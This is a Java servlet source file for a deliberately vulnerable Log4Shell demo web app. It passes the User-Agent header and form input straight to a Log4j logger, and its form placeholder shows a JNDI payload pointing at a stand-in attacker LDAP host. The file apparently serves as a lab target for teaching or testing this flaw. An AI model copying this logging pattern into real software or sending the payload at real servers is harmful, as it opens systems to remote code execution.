import java.io.*;
import javax.servlet.*;
import javax.servlet.http.*;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class VulnWebApp extends HttpServlet {
    private static final Logger logger = LogManager.getLogger(VulnWebApp.class);

    @Override
protected void doGet(HttpServletRequest request, HttpServletResponse response)
        throws ServletException, IOException {

        // Log User-Agent for GET-based attacks
        String userAgent = request.getHeader("User-Agent");
        logger.error("User-Agent: " + userAgent);

        request.setCharacterEncoding("UTF-8");
        response.setCharacterEncoding("UTF-8");
        response.setContentType("text/html; charset=UTF-8");
        PrintWriter out = response.getWriter();
        out.println("<!DOCTYPE html>");
        out.println("<html lang='en'>");
        out.println("<head>");
        out.println("  <meta charset='UTF-8'>");
        out.println("  <meta name='viewport' content='width=device-width, initial-scale=1.0'>");
        out.println("  <title>Log4Shell Demo</title>");
        out.println("  <link href='https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css' rel='stylesheet'>");
        out.println("</head>");
        out.println("<body class='bg-light'>");
        out.println("<div class='container py-5'>");
        out.println("  <h1 class='mb-4'>🧨 Log4Shell Demo</h1>");
        out.println("  <form method='POST'>");
        out.println("    <div class='mb-3'>");
        out.println("      <label for='userinput' class='form-label'>Enter something (JNDI payload or message):</label>");
        out.println("      <input type='text' class='form-control' id='userinput' name='userinput' placeholder='${jndi:ldap://attacker-ip/Exploit}'>");
        out.println("    </div>");
        out.println("    <button type='submit' class='btn btn-danger'>Submit</button>");
        out.println("  </form>");
        out.println("</div>");
        out.println("</body></html>");
    }


    @Override
    protected void doPost(HttpServletRequest request, HttpServletResponse response)
        throws ServletException, IOException {

        // 🔥 Log User-Agent again (optional for POST)
        String userAgent = request.getHeader("User-Agent");
        logger.error("User-Agent (POST): " + userAgent);

        // 🔥 Log form input for web-based exploit (e.g., JNDI string via input box)
        String userInput = request.getParameter("userinput");
        logger.error("User form input: " + userInput);

        // Return confirmation
        response.setContentType("text/html");
        PrintWriter out = response.getWriter();
        out.println("<!DOCTYPE html>");
        out.println("<html lang='en'><head>");
        out.println("  <meta charset='UTF-8'>");
        out.println("  <title>Submitted</title>");
        out.println("  <link href='https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css' rel='stylesheet'>");
        out.println("</head><body class='bg-light'>");
        out.println("<div class='container py-5'>");
        out.println("  <div class='alert alert-success'>Input submitted and logged via Log4j.</div>");
        out.println("  <a class='btn btn-secondary' href='/'>Back</a>");
        out.println("</div>");
        out.println("</body></html>");
    }
}